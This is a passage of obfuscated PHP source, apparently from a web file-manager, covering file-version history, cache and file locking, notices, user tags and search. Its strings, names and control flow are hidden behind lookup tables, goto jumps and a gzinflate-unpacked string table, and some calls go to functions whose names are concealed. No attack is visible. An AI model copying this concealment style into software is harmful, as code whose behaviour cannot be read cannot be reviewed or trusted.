$_SERVER[̉]; $Cհ = array(); foreach ($eԛ̂ as $fĤ܂А => $eߏę) { goto cʴ; Bم: if ($Dص[$eÅԃ[29]] == $eÅԃ[1917]) { $Cհ[] = $Dص[$eÅԃ[431]][$eÅԃ[395]]; } goto A❄; E뺘: $Cհ[] = $Dص[$eÅԃ[395]]; $Cհ[] = $Dص[$eÅԃ[1909]]; if ($Dص[$eÅԃ[29]] == $eÅԃ[520]) { $Cհ[] = $Dص[$eÅԃ[431]][$eÅԃ[1054]]; $Cհ[] = $Dص[$eÅԃ[431]][$eÅԃ[1055]]; } goto Bم; cʴ: $Dص = json_decode($eߏę[$eÅԃ[431]], !0); if ($eߏę[$eÅԃ[29]] == $eÅԃ[1666]) { $Dص = $this->descZipDownload($Dص, $Cհ); $eԛ̂[$fĤ܂А][$eÅԃ[431]] = json_encode($Dص); continue; } if (strpos($eߏę[$eÅԃ[29]], $eÅԃ[1910]) !== 0) { if (!isset($Dص[$eÅԃ[76]]) || strpos($eߏę[$eÅԃ[29]], $eÅԃ[2099]) !== 0) { continue; } try { $DԖ = IO::infoFull($Dص[$eÅԃ[76]]); } catch (Exception $dޣպ) { continue; } $Cհ[] = $Dص[$eÅԃ[395]] = $DԖ[$eÅԃ[395]]; $Cհ[] = $Dص[$eÅԃ[1909]] = $DԖ[$eÅԃ[478]]; $eԛ̂[$fĤ܂А][$eÅԃ[431]] = json_encode($Dص); continue; } goto E뺘; A❄: } if (!$Cհ) { return array(); } return Model($eÅԃ[793])->sourceListInfo($Cհ, !0); } private function logList($BǙ) { goto A; eյמ: $F = $this->getSourceList($BǙ); $Bկ = $this->typeAll(); $aۂ = array(); goto a̠żѐ; A: return $aۂ; goto Aӥ; A: $C =& $_SERVER[̉]; $Dל = array_to_keyvalue($BǙ, $C[33], $C[1531]); $eޖ = Model($C[506])->userListInfo(array_unique($Dל)); goto eյמ; a̠żѐ: $d΂ = array(); foreach ($BǙ as $E => $AՅ) { goto EɌá; c흦: $this->ipAddress($AՅ); if (strpos($F, $C[1910]) === 0 || isset($Fฮ[$C[1909]])) { goto bވ; CŦ: if ($Fฮ[$C[1922]] && $Fฮ[$C[1922]][$C[404]] == $C[1170]) { $d΂[] = $AՅ[$C[393]]; unset($BǙ[$E]); continue; } goto bֹͨć; Bȶ: if ($Fฮ[$C[29]] == $C[1917]) { $Fฮ[$C[431]][$C[395]] = $F[$Fฮ[$C[431]][$C[395]]]; } if ($Fฮ[$C[29]] == $C[1661]) { $Fฮ[$C[1922]] = $Fฮ[$C[85]]; $Fฮ[$C[1909]] = $Fฮ[$C[1922]][$C[395]]; $Fฮ[$C[85]] = !1; $Fฮ[$C[395]] = $C[33]; } if ($Fฮ[$C[85]] && $Fฮ[$C[85]][$C[404]] == $C[1170]) { $d΂[] = $AՅ[$C[393]]; unset($BǙ[$E]); continue; } goto CŦ; bވ: $Fฮ[$C[85]] = $F[$Fฮ[$C[395]]]; $Fฮ[$C[1922]] = $F[$Fฮ[$C[1909]]]; if ($Fฮ[$C[29]] == $C[520]) { $Fฮ[$C[431]][$C[1054]] = $F[$Fฮ[$C[431]][$C[1054]]]; $Fฮ[$C[431]][$C[1055]] = $F[$Fฮ[$C[431]][$C[1055]]]; } goto Bȶ; bֹͨć: } $AՅ[$C[431]] = $Fฮ; goto cڝ; cڝ: unset($AՅ[$C[2102]]); $aۂ[] = $AՅ; goto Bč; bᡡ: $AՅ[$C[28]] = isset($Eՙ[$C[28]]) ? $Eՙ[$C[28]] : LNG($C[2096]); $AՅ[$C[1959]] = isset($Eՙ[$C[1959]]) ? $Eՙ[$C[1959]] : $C[33]; $AՅ[$C[1435]] = isset($Bկ[$F]) ? $Bկ[$F] : $eƛ; goto E; EɌá: $F = $AՅ[$C[29]]; $Eՙ = isset($eޖ[$AՅ[$C[1531]]]) ? $eޖ[$AՅ[$C[1531]]] : !1; $eƛ = strpos($F, $C[2100]) === 0 ? LNG($C[2101]) : LNG($C[2096]); goto bᡡ; E: $AՅ[$C[1852]] = $Eՙ; $Fฮ = json_decode($AՅ[$C[431]], !0); $AՅ[$C[2093]] = isset($Fฮ[$C[2093]]) ? $Fฮ[$C[2093]] : $C[33]; goto c흦; Bč: } $this->clearSystemPathLog($d΂); goto A; Aӥ: } private function clearSystemPathLog($D) { $cܫ =& $_SERVER[̉]; if (count($D) == 0) { return; } $e뻫Ͱ = array($cܫ[393] => array($cܫ[7], array_unique($D))); $this->where($e뻫Ͱ)->delete(); } public function deviceList($BĴ, $e = 0) { $b =& $_SERVER[̉]; $DދϘ = array($b[1531] => $BĴ, $b[194] => array($b[970], $e), $b[29] => $b[1635]); $AѾي↥ = array(); $D匶 = $this->field($b[2103])->where($DދϘ)->order($b[1920])->limit(50)->select(); foreach ($D匶 as $d => $D͸) { goto c; C᨟: $this->ipAddress($D͸); $D͸[$b[431]] = $B; $AѾي↥[$cǴÇٯ] = $D͸; goto a،Ѩ; c: if ($d > 0 && abs($D͸[$b[194]] - $D匶[$d - 1][$b[194]]) < 5) { continue; } $B = json_decode($D͸[$b[431]], !0); $D͸[$b[2093]] = isset($B[$b[2093]]) ? $B[$b[2093]] : $b[33]; goto e; e: unset($B[$b[2093]]); $cǴÇٯ = $this->deviceType($B[$b[1911]]); if (isset($AѾي↥[$cǴÇٯ])) { continue; } goto C᨟; a،Ѩ: } return array_values($AѾي↥); } public function deviceType($a) { return $a; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x6e\x6f\x74\x69\x63\145\114\x69\x73\x74"; public $field = array("\156\x61\155\145", "\x63\157\156\x74\145\x6e\164", "\x61\x75\164\x68", "\155\x6f\x64\x65", "\164\151\155\145", "\x74\171\160\145", "\x6c\x65\x76\x65\x6c", "\145\156\x61\x62\x6c\145", "\163\x6f\x72\x74"); public function listData($Cϭ = false, $fŻ = "\163\x6f\162\164", $dފ = false) { return parent::listData($Cϭ, $fŻ, $dފ); } public function add($bÝ) { $BƖ =& $_SERVER[̉]; $aәՋ = time(); if ($bÝ[$BƖ[12]] == $BƖ[2104]) { $aәՋ = strtotime($bÝ[$BƖ[197]]); } $bÝ[$BƖ[197]] = $aәՋ; return parent::insert($bÝ); } public function update($f, $bĪ) { goto E鿛; D꺄: return parent::update($f, $bĪ); goto A; fǄ: $fﴭ = time(); if ($bĪ[$bҔŧ[12]] == $bҔŧ[2104]) { $fﴭ = strtotime($bĪ[$bҔŧ[197]]); } $bĪ[$bҔŧ[197]] = $fﴭ; goto D꺄; E鿛: $bҔŧ =& $_SERVER[̉]; $Eޏ = $this->listData($f); if (!$Eޏ) { return !1; } goto fǄ; A: } public function remove($D⃄) { $aʴ = $this->listData($D⃄); if (!$aʴ || $aʴ[$_SERVER[̉][1170]]) { return !1; } return parent::remove($D⃄); } public function sort($A, $Aͭ) { return parent::update($A, $Aͭ); } public function enable($b, $e) { return parent::update($b, array($_SERVER[̉][2105] => $e)); } private function initUserOption() { $D儩 =& $_SERVER[̉]; $this->optionType = $D儩[2106]; $this->modelType = $D儩[2107]; $this->field = array($D儩[2108], $D儩[28], $D儩[197], $D儩[29], $D儩[2109], $D儩[713], $D儩[189]); } public function userNoticeGet($ał = false) { $this->initUserOption(); return parent::listData($ał, $_SERVER[̉][393], !0); } public function userNoticeAdd($eѦ) { $eݺȢ =& $_SERVER[̉]; $this->initUserOption(); $e։ = $this->findByKey($eݺȢ[2108], $eѦ[$eݺȢ[393]]); if ($e։) { return !0; } $f酥 = array($eݺȢ[2108] => $eѦ[$eݺȢ[393]], $eݺȢ[28] => $eѦ[$eݺȢ[28]], $eݺȢ[197] => $eѦ[$eݺȢ[197]], $eݺȢ[29] => isset($eѦ[$eݺȢ[29]]) ? $eѦ[$eݺȢ[29]] : 1, $eݺȢ[2109] => isset($eѦ[$eݺȢ[2109]]) ? $eѦ[$eݺȢ[2109]] : 0, $eݺȢ[713] => 0, $eݺȢ[189] => 0); return parent::insert($f酥); } public function userNoticeEdit($Dˠ, $fʶ) { $this->initUserOption(); return parent::update($Dˠ, $fʶ); } } goto E򣽰; dɹ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto eզ; eզ: $e܉ =& $_SERVER[̉]; if (self::$handle) { return self::$handle; } $f = $GLOBALS[$e܉[6]][$e܉[347]]; goto Cȉִ; Cȉִ: self::$timeout = $f[$e܉[808]] ? $f[$e܉[808]] : 10; $cƷ = _get($GLOBALS[$e܉[6]], $e܉[809]); $E = $f[$e܉[795]] ? $f[$e܉[795]] : $e܉[193]; goto Dҗ; Dҗ: if ($E == $e܉[17] && $cƷ == $e܉[9]) { $E = $e܉[193]; } switch ($E) { case $e܉[798]: self::$handle = new CacheLockRedis(); break; case $e܉[799]: self::$handle = new CacheLockMemcached(); break; case $e܉[17]: self::$handle = new CacheLockDatabase(); break; case $e܉[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto c; c: } private static function key($eϝ) { return $_SERVER[̉][810] . Cache::key($eϝ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Cӕ = '') { self::$errorMsg = $Cӕ; } public static function lockGlobal($AĂك, $F) { return self::lock($AĂك, $F, !0); } public static function lock($c, $Bʡ = false, $Fɦ׎ = false) { goto A꥛; CǇ: $Bʡ = $Bʡ ? $Bʡ : self::$timeout; $d몇 = $Bߓ->lock($E, $Bʡ); if (!$d몇) { $fӲǇ = "\154\x6f\x63\153\40\x65\x72\162\x6f\x72\73\153\x65\171\x3d{$c}\73\164\151\x6d\145\x3d{$Bʡ}\x3b" . self::$errorMsg . $cԺ[68] . get_caller_msg(); $A = LNG($cԺ[811]) . "\x28{$Bʡ}\163\x29\x2e" . LNG($cԺ[812]); $A .= $cԺ[813]; if (is_string(self::$errorMsg) && self::$errorMsg) { $A = $A . $cԺ[814] . self::$errorMsg; } write_log($fӲǇ, $cԺ[815]); show_json($A, !1); } goto Bۤ; Bۤ: if (!$Fɦ׎) { self::$lockItem[$E] = !0; } return $d몇; goto F; A꥛: $cԺ =& $_SERVER[̉]; $Bߓ = self::init(); $E = self::key($c); goto CǇ; F: } public static function lockGet($BŔ췝) { $B٠ʠ = self::key($BŔ췝); if (self::$lockItem[$B٠ʠ]) { return self::$lockItem[$B٠ʠ]; } return self::init()->lockGet($B٠ʠ); } public static function unlock($Cӹ) { $D埢щ = self::key($Cӹ); self::$lockItem[$D埢щ] = null; return self::init()->unlock($D埢щ); } public static function unlockRuntime() { $aމ =& $_SERVER[̉]; $aب̖ = self::init(); $b˄ = !1; foreach (self::$lockItem as $A龎̆Ľ => $Eß) { if (!$Eß) { continue; } $aب̖->unlock($A龎̆Ľ); if (!$b˄) { $b˄ = !0; write_log($aމ[816] . $A龎̆Ľ . $aމ[68] . get_caller_msg(), $aމ[815]); continue; } write_log($aމ[816] . $A龎̆Ľ, $aމ[815]); } self::fileUnlockAll(); } public static function fileLock($BՏ) { goto eʢ; CҘ: $d = fopen(DATA_PATH . $BՏ . $FȈ፤[818], $FȈ፤[819]); if (!$d) { return !1; } $GLOBALS[$FȈ፤[817]][$BՏ] = $d; goto Cƃ; Cƃ: if (flock($d, LOCK_EX)) { return !0; } self::unlock($BՏ); show_json($FȈ፤[820], !1); goto e; eʢ: $FȈ፤ =& $_SERVER[̉]; if (!$GLOBALS[$FȈ፤[817]]) { $GLOBALS[$FȈ፤[817]] = array(); } $GLOBALS[$FȈ፤[817]][$BՏ] = !1; goto CҘ; e: return !1; goto cؙܿ; cؙܿ: } public static function fileUnlock($b) { $cįю =& $_SERVER[̉]; $FҘ = $GLOBALS[$cįю[817]][$b]; if (!$FҘ) { return; } $GLOBALS[$cįю[817]][$b] = !1; flock($FҘ, LOCK_UN); fclose($FҘ); } public static function fileUnlockAll() { $e =& $_SERVER[̉]; if (!$GLOBALS[$e[817]]) { return; } foreach ($GLOBALS[$e[817]] as $e򛣧 => $e) { if (!$e) { continue; } $GLOBALS[$e[817]][$e򛣧] = !1; flock($e, LOCK_UN); fclose($e); } $GLOBALS[$e[817]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $a͎ӏ =& $_SERVER[̉]; $f僙уȤ = $GLOBALS[$a͎ӏ[6]][$a͎ӏ[347]]; self::$cachePath = $f僙уȤ[$a͎ӏ[193]][$a͎ӏ[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($bފ, $Dğ = 0) { goto bǑ; a޴Ӻ: $eØ = rtrim(self::$cachePath, $CҠ괤[8]) . $CҠ괤[821] . md5($bފ) . $CҠ괤[818]; if (file_exists($eØ) && filemtime($eØ) && filemtime($eØ) < time() - 10) { @unlink($eØ); } do { if (file_exists($eØ)) { cacheLockWait(); continue; } $dϊ = fopen($eØ, $CҠ괤[822]); if (!$dϊ) { return !1; } $aġ = flock($dϊ, LOCK_EX | LOCK_NB); self::$caches[$bފ] = array($CҠ괤[823] => $dϊ, $CҠ괤[193] => $eØ); fwrite($dϊ, $bܐ); clearstatcache(); if ($dϊ && $aġ) { return !0; } cacheLockWait(); } while (microtime(!0) < $bܐ); goto cֺ߉ۂ; bǑ: $CҠ괤 =& $_SERVER[̉]; $Eɥު = microtime(!0); $bܐ = $Eɥު + $Dğ + 0.0001; goto a޴Ӻ; cֺ߉ۂ: $this->unlock($bފ); return !1; goto c; c: } public function lockGet($bŜ) { $c =& $_SERVER[̉]; $dϟ = rtrim(self::$cachePath, $c[8]) . $c[821] . md5($bŜ) . $c[818]; return file_exists($dϟ); } public function unlock($b) { goto f; aࡖʲ: @flock($A彌[$d拓[823]], LOCK_UN); @fclose($A彌[$d拓[823]]); @unlink($A彌[$d拓[193]]); goto Bӹ; Bӹ: unset(self::$caches[$b]); goto f͈; f: $d拓 =& $_SERVER[̉]; $A彌 = self::$caches[$b]; if (!$A彌) { return; } goto aࡖʲ; f͈: } } goto b٘; d۸ݨ: $F = $_SERVER[̉][574]; if (!$F) { die; } $_SERVER[랬] = explode($_SERVER[̉][575], gzinflate(substr($_SERVER[̉][576], 10, -8))); goto A; Ḟ: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\56\x74\141\147\114\x69\163\x74"; public $modelType = "\125\163\x65\162\x4f\x70\164\x69\157\x6e"; public $field = array("\156\141\155\x65", "\163\164\171\x6c\x65", "\x73\157\x72\x74"); public function listData($dמ܏ = false, $a = "\x73\157\162\164", $A鄓ء = false) { return parent::listData($dמ܏, $a, $A鄓ء); } public function remove($F) { return parent::remove($F); } public function add($A, $aư = "\x6c\141\x62\145\154\55\147\162\x65\x79\x2d\156\x6f\162\155\141\154") { $F쨷 =& $_SERVER[̉]; if ($this->findByName($A)) { return !1; } $cͰ = array($F쨷[413] => $A, $F쨷[464] => $aư, $F쨷[1699] => $this->getSort($F쨷[256]) + 1); return parent::insert($cͰ); } public function update($aǮʷ, $c̽) { $D߸ =& $_SERVER[̉]; $bصѤ = $this->listData($aǮʷ); $dϫә = $this->findByName($c̽[$D߸[28]]); if (!$bصѤ || $dϫә && $dϫә[$D߸[393]] != $bصѤ[$D߸[393]]) { return !1; } return parent::update($aǮʷ, $c̽); } public function moveTop($AŇ࡫) { $c׆ =& $_SERVER[̉]; $d = parent::listData(); $b = $this->getSort($c׆[255]); foreach ($d as &$Fԉ͓) { if ($Fԉ͓[$c׆[393]] == $AŇ࡫) { $Fԉ͓[$c׆[1718]] = $b; continue; } $Fԉ͓[$c׆[1718]] += 1; } unset($Fԉ͓); return parent::resetData($d); } public function moveBottom($AٯΧ) { $d =& $_SERVER[̉]; $Aû = $this->getSort($d[256]) + 1; return parent::update($AٯΧ, array($d[1718] => $Aû)); } public function resetSort($Aَ) { goto Eцݐ; Eцݐ: $c =& $_SERVER[̉]; $a = array(); $Aَ = is_array($Aَ) ? $Aَ : array(); goto Aڟ; Ać: unset($dӬ); return parent::resetData($bȯ); goto Fު; Aڟ: for ($aŶ = 0; $aŶ < count($Aَ); $aŶ++) { $a[$Aَ[$aŶ] . $c[33]] = $aŶ + 1; } $bȯ = parent::listData(); foreach ($bȯ as &$dӬ) { $B = $a[$dӬ[$c[393]]]; $dӬ[$c[1718]] = $B ? $B : $dӬ[$c[1718]]; } goto Ać; Fު: } private function getSort($e墄΅) { $F㿃 =& $_SERVER[̉]; $C، = parent::listData(); $CɄ = array_to_keyvalue($C،, $F㿃[33], $F㿃[1718]); if (!$CɄ) { $CɄ = array(0); } $a = $e墄΅ == $F㿃[256] ? max($CɄ) : min($CɄ); return intval($a); } } goto DƵ; FѾ: if ($_SERVER[$_SERVER[̉][834]] != $D($Fٶ)) { goto d; b: $aԎ($Fٶ); goto b; f: $d = explode($_SERVER[̉][229], $Fʐ); if (count($d) < $_SERVER[̉][583]) { $aѨ = $_SERVER[̉][840]; $aѨ(); } $aԎ = $_SERVER[̉][1215]; goto b; d: $Dح = $_SERVER[̉][837]; $FǗˇ = $_SERVER[$_SERVER[̉][838]] . $_SERVER[̉][839]; $Fʐ = $Dح($FǗˇ); goto f; b: } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\162\143\x65\137\x68\151\163\164\x6f\x72\171"; public function historyCount($dƯ) { goto Eﮈظ; aֳ䵐: return array_to_keyvalue($Cԛ, $Cʅ[395], $Cʅ[480]); goto eك; E: $D֎ = array($Cʅ[395], $Cʅ[1727] => $Cʅ[480]); $Dԥ = array($Cʅ[395] => array($Cʅ[7], $dƯ)); $Cԛ = $this->field($D֎)->where($Dԥ)->group($Cʅ[395])->select(); goto aֳ䵐; Eﮈظ: $Cʅ =& $_SERVER[̉]; if (!$dƯ) { return array(); } if (is_string($dƯ) || is_int($dƯ)) { $dƯ = array($dƯ); } goto E; eك: } public function addHistory($bȿǔ, $fˏ櫜 = '') { $f܍ =& $_SERVER[̉]; $Fߞ = array($f܍[410] => $bȿǔ[$f܍[395]], $f܍[1523] => isset($bȿǔ[$f܍[434]]) ? $bȿǔ[$f܍[434]] : $bȿǔ[$f܍[432]], $f܍[448] => $bȿǔ[$f܍[447]], $f܍[548] => $bȿǔ[$f܍[78]], $f܍[1923] => $fˏ櫜); $dᷘ = $GLOBALS[$f܍[6]][$f܍[88]][$f܍[1103]]; if ($dᷘ > 1) { $this->historyAutoClear($Fߞ[$f܍[395]]); $this->add($Fߞ); } Hook::trigger($f܍[1924], $Fߞ); Model($f܍[1925])->eventFileEdit($bȿǔ[$f܍[395]]); } private function historyAutoClear($d̒) { goto F싻築; eϾ: $this->where($A)->delete(); Model($a[450])->remove($a׌); goto BՋ; bѺ: $aң = $DӸ == $a[1126] ? 5 : $dٯ; if ($dٯ <= 1) { $aң = 1; } if ($aң >= 500) { return; } goto F˳; Cՠ: $F㕮 = array_to_keyvalue($c, $a[33], $a[393]); $F㕮 = array_slice($F㕮, $aң); $a׌ = array_to_keyvalue($c, $a[33], $a[447]); goto eͯ; F싻築: $a =& $_SERVER[̉]; $DӸ = Model($a[733])->get($a[1125]); $dٯ = $GLOBALS[$a[6]][$a[88]][$a[1103]]; goto bѺ; F˳: $A = array($a[410] => $d̒); $c = $this->field($a[1926])->where($A)->order($a[1920])->select(); if (!$c || $aң >= count($c)) { return; } goto Cՠ; eͯ: $a׌ = array_slice($a׌, $aң); if (!$F㕮 || !$a׌) { return; } $A = array($a[412] => array($a[7], $F㕮)); goto eϾ; BՋ: } public function listData($EƂ) { goto Fֻǎ; bꋶ: $Bڛ = $this->field($F)->where($B媿)->order($Bä[1920])->selectPage(); $this->_listAppendUser($Bڛ[$Bä[367]]); $b = Model($Bä[733])->get($Bä[1125]); goto Cٻ; Cٻ: $e = 5; if ($b == $Bä[1126]) { $Bڛ[$Bä[367]] = array_slice($Bڛ[$Bä[367]], 0, $e); $Bڛ[$Bä[364]] = array($Bä[1928] => 1, $Bä[1929] => 20, $Bä[1930] => 1, $Bä[1931] => count($Bڛ[$Bä[367]])); } return $Bڛ; goto D΢Ϣ; Fֻǎ: $Bä =& $_SERVER[̉]; $B媿 = array($Bä[410] => $EƂ); $F = $Bä[1927]; goto bꋶ; D΢Ϣ: } protected function _listAppendUser(&$F) { $d =& $_SERVER[̉]; $A²ͳ = array_to_keyvalue($F, $d[33], $d[1531]); $eʸ = Model($d[506])->userListInfo($A²ͳ); foreach ($F as &$Dݭ§) { $F = $Dݭ§[$d[1531]]; $Dݭ§[$d[432]] = $eʸ[$F] ? $eʸ[$F] : !1; } unset($Dݭ§); } public function fileInfo($C̷) { $cꗉ =& $_SERVER[̉]; $fۦ⼾ = $this->tablePrefix; $f = "{$fۦ⼾}\x69\157\137\x66\x69\154\x65\x20\x66\x69\154\x65\163\40\x6f\156\40\146\x69\x6c\145\x73\x2e\146\x69\x6c\x65\111\104\x20\75\x20\150\x69\163\164\x6f\162\171\x2e\146\x69\x6c\145\x49\104"; return $this->alias($cꗉ[1932])->where(array($cꗉ[412] => $C̷))->join($f, $cꗉ[1933])->find(); } public function removeItem($Cݜܕ) { $B =& $_SERVER[̉]; $A = array($B[412] => $Cݜܕ); $dˑħ = $this->where($A)->find(); if ($dˑħ) { $eȈ = $this->where($A)->delete(); Model($B[450])->remove($dˑħ[$B[447]]); return $eȈ; } return !1; } public function removeBySource($F渇) { goto aŝ; aŝ: $Bʇ =& $_SERVER[̉]; if (!$F渇) { return !1; } if (!is_array($F渇)) { $F渇 = array($F渇); } goto aöЂ; D: return !0; goto C¸; aöЂ: $d = array($Bʇ[410] => array($Bʇ[7], $F渇)); $d = $this->field($Bʇ[448])->where($d)->select(); if ($d) { $this->where($d)->delete(); $fȘ = array_to_keyvalue($d, $Bʇ[33], $Bʇ[447]); Model($Bʇ[450])->remove($fȘ); } goto D; C¸: } public function setDetail($AВٿ, $dעʿԟ) { $Eݸ =& $_SERVER[̉]; return $this->where(array($Eݸ[412] => $AВٿ))->save(array($Eݸ[1923] => $dעʿԟ)); } public function rollbackToItem($A, $fښ) { goto eզ; F̴: $Aֺ = $this->find($fښ); $fٍ = array($Dƨ[447] => $Aֺ[$Dƨ[447]], $Dƨ[78] => $Aֺ[$Dƨ[78]], $Dƨ[84] => time(), $Dƨ[434] => USER_ID); Model($Dƨ[793])->where(array($Dƨ[395] => $A))->save($fٍ); goto DК񳠬; DК񳠬: return $this->where(array($Dƨ[412] => $fښ))->delete(); goto fВ; eզ: $Dƨ =& $_SERVER[̉]; $A茷Օ = Model($Dƨ[793])->sourceInfo($A); $this->addHistory($A茷Օ, LNG($Dƨ[1934])); goto F̴; fВ: } public function clearSame($c) { goto e; A: $Fӱ̄ݓ = array(); $a߶ = array(); foreach ($eŋǱ as $Aɂ) { if (!$Aɂ || count($Aɂ) <= 1) { continue; } foreach ($Aɂ as $D) { $Fӱ̄ݓ[] = $D[$E︈[447]]; $a߶[] = $D[$E︈[393]]; } } goto a𥶋; e: $E︈ =& $_SERVER[̉]; $F߅ = $this->listData($c); $eŋǱ = array_to_keyvalue_group($F߅, $E︈[447]); goto A; a𥶋: if (!$a߶) { return; } $this->where(array($E︈[393] => array($E︈[7], $a߶)))->delete(); Model($E︈[450])->remove($Fӱ̄ݓ); goto C̈́̂ݬ; C̈́̂ݬ: } public function userSpace() { $B =& $_SERVER[̉]; $e汌 = $this->tablePrefix; $Aӵê = array($B[1523] => USER_ID); $b߯ = "{$e汌}\x69\x6f\x5f\146\x69\154\145\40\146\x69\x6c\145\x73\x20\157\x6e\40\x66\x69\x6c\x65\163\56\x66\x69\x6c\x65\111\104\40\75\x20\x68\151\163\164\157\x72\171\56\x66\x69\154\145\111\104"; return $this->alias($B[1932])->where($Aӵê)->join($b߯, $B[1933])->sum($B[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($DŽ) { goto F; F: $F׆ =& $_SERVER[̉]; $c = KodIO::fileTypeList(); $E԰ = $c[$DŽ]; goto Fܤ֌; Fܤ֌: if (!$E԰) { return array(); } $a´ډӃ = $E԰[$F׆[168]]; $dݮ = $F׆[7]; goto bʹÍ; bʹÍ: if (!$E԰[$F׆[168]]) { $AҒ = array_to_keyvalue($c, $F׆[33], $F׆[168]); $a´ډӃ = implode($F׆[47], $AҒ); $dݮ = $F׆[1935]; } $AЯ = explode($F׆[47], trim($a´ډӃ, $F׆[47])); return array($dݮ, $AЯ); goto b̭; b̭: } public function listPathType($b) { $D =& $_SERVER[̉]; $b = $this->fileTypeWhere($b); if (!$b) { return array(); } $e܍Ԇ = array($D[549] => SourceModel::TYPE_USER, $D[550] => USER_ID, $D[546] => 0, $D[547] => $b); return $this->listSource($e܍Ԇ); } public function listSearch($D, $cƌ = 300) { goto c; dَ܍: if (!isset($E[$Fñ[423]])) { $E[$Fñ[423]] = 0; } $B = $Fñ[1937]; $dȘቍ = $B; goto e; E㒷: $bׯ = $this->distinct(!0)->field($B)->where($E)->selectPage($cƌ); $this->_listSearchFileContent($bׯ, $D, $dȘቍ); $this->_listSearchDesc($bׯ, $D, $dȘቍ); goto DЦ; e: $this->_listSearchBindPinyin($D, $E, $B); $this->alias($Fñ[516])->_makeOrder(); $E = $this->parseWhereLike($E); goto E㒷; B: $this->_listMake($bׯ); return $bׯ; goto a݂խ; DЦ: $this->_listSearchTag($bׯ, $D, $dȘቍ); $this->_listSearchGroupTag($bׯ, $D, $dȘቍ); $this->_listDataApply($bׯ[$Fñ[367]]); goto B; c: $Fñ =& $_SERVER[̉]; if (isset($D[$Fñ[1778]]) && $D[$Fñ[1778]]) { $D[$Fñ[1778]] = str_replace($Fñ[381], $Fñ[1936], trim($D[$Fñ[1778]])); } $E = $this->_parseSearchWhere($D); goto dَ܍; a݂խ: } private function _listSearchFileContent(&$C, $eԣ, $D) { goto aܴą; eߑ: if (!isset($F𽃦[$d݌[28]]) || !is_array($eԣ[$d݌[447]])) { return; } $F𽃦[$d݌[447]] = array($d݌[7], $eԣ[$d݌[447]]); unset($F𽃦[$d݌[28]]); goto d۸; bƥ: $C[$d݌[367]] = array_merge($Aע, $C[$d݌[367]]); $C[$d݌[364]][$d݌[365]] += count($Aע); goto b; d۸: unset($eԣ[$d݌[447]]); $Aע = $this->field($D)->where($F𽃦)->limit($d݌[1938])->select(); if (!$Aע || count($Aע) == 0) { return; } goto bƥ; aܴą: $d݌ =& $_SERVER[̉]; if (!$eԣ[$d݌[1778]] || $C[$d݌[364]][$d݌[351]] > 1) { return; } $F𽃦 = $this->_parseSearchWhere($eԣ); goto eߑ; b: } private function _listSearchTag(&$f, $e, $C) { goto aɤĒ; bۖƇ: $B = array_to_keyvalue($B, $eȿ[33], $eȿ[76]); $aۭ = array_unique($B); $this->_listSearchMerge($f, $e, $C, $aۭ); goto Bو; bӧ: $Fɷ = array(); $aߒ = $e[$eȿ[1778]]; foreach ($Aھ as $fӄ) { $a = $fӄ[$eȿ[28]]; $d㏙ = str_replace($eȿ[50], $eȿ[33], Pinyin::encode($a)); if (stripos($a, $aߒ) !== !1 || stripos($d㏙, $aߒ) !== !1) { $Fɷ[] = $fӄ[$eȿ[393]]; } } goto d΢; aɤĒ: $eȿ =& $_SERVER[̉]; if (!$e[$eȿ[1778]] || $f[$eȿ[364]][$eȿ[351]] > 1) { return; } $Aھ = Model($eȿ[1939])->listData(); goto bӧ; d΢: if (!$Fɷ) { return; } $eƕ˻҉ = array($eȿ[419] => array($eȿ[7], $Fɷ), $eȿ[1531] => USER_ID); $B = Model($eȿ[420])->field($eȿ[76])->where($eƕ˻҉)->select(); goto bۖƇ; Bو: } private function _listSearchDesc(&$d׭, $Eڭ㢐, $Dޚ) { goto DѨȾ; d֚: $d = Model($B[532])->field($B[395])->where($d۾⑺)->select(); $Cä = array_to_keyvalue($d, $B[33], $B[395]); $this->_listSearchMerge($d׭, $Eڭ㢐, $Dޚ, $Cä); goto Aڿ; DѨȾ: $B =& $_SERVER[̉]; if (!$Eڭ㢐[$B[1778]] || $d׭[$B[364]][$B[351]] > 1) { return; } $A = $this->listSearchChildren($Eڭ㢐[$B[478]]); goto E̋; E̋: $A = array_unique($A); if (!$A) { return; } $d۾⑺ = array($B[395] => array($B[7], $A), $B[93] => $B[431], $B[372] => array($B[380], $B[1780] . $Eڭ㢐[$B[1778]] . $B[1780])); goto d֚; Aڿ: } private function _listSearchGroupTag(&$E샤, $a, $A٢) { goto C; AČԞ: if (!$aͿӯ || $aͿӯ[$a[404]] != SourceModel::TYPE_GROUP) { return; } $d̍ = $aͿӯ[$a[484]]; $F¬ = Model($a[1940])->get($d̍); goto b̅ڼ; b̅ڼ: $dߗ = array(); $A = $a[$a[1778]]; foreach ($F¬[$a[367]] as $Aܕ) { $B֋ = $Aܕ[$a[28]]; $e = str_replace($a[50], $a[33], Pinyin::encode($B֋)); if (stripos($B֋, $A) !== !1 || stripos($e, $A) !== !1) { $dߗ[] = $Aܕ[$a[393]]; } } goto f靇; E탂: $Aֳ = array_to_keyvalue($Aֳ, $a[33], $a[76]); $a = array_unique($Aֳ); $this->_listSearchMerge($E샤, $a, $A٢, $a); goto Dǧ; C: $a =& $_SERVER[̉]; if (!$a[$a[1778]] || $E샤[$a[364]][$a[351]] > 1 || !$a[$a[478]]) { return; } $aͿӯ = $this->sourceInfo($a[$a[478]]); goto AČԞ; f靇: if (!$dߗ) { return; } $f֙׮ = array($a[419] => array($a[7], $dߗ), $a[1531] => 0, $a[29] => $a[1802] . $d̍); $Aֳ = Model($a[420])->field($a[76])->where($f֙׮)->select(); goto E탂; Dǧ: } private function _listSearchMerge(&$cЧ, $d, $D﷈ą, $B⬻) { goto CӇ; CӇ: $e =& $_SERVER[̉]; if (!$B⬻) { return; } $A = array_to_keyvalue($cЧ[$e[367]], $e[33], $e[395]); goto eː; eː: $Cɞ = array_diff($B⬻, $A); if (!$Cɞ) { return; } $a۝ = array($e[395] => 